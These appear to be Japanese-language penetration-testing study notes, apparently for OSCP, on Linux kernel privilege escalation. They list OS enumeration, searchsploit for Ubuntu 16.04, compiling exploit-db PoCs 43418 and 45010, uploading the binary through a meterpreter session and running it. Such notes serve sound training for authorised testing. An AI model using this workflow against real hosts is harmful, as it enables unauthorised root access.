# Kernel Vulnerabilities

まずはOSのバージョンを精査

```
cat /etc/issue
uname -r
arch
```

searchsploitする

```
searchsploit linux kernel ubuntu 16.04
```

PoCをコンパイルする（ターゲットのアーキテクチャに合わせる）

```
gcc 43418.c -o exploit
ls -lah exploit
```



### ubuntu 16.04(45010)

* 攻撃対象ホストがgccを持っているか確認する

  ```bash
  gcc
  find / -name gcc -type f 2>/dev/null
  ```

* ない場合、kaliでコンパイルする

  ```bash
  gcc -static 45010.c -o 45010
  ```

* meterpreterでアップロードする

  ```bash
  meterpreter > upload /home/kali/Documents/OSCP/24.Assembling_the_peces/45010 /tmp/
  ```

* 実行する

  ```bash
  chmod +x 45010
  ./45010
  ```



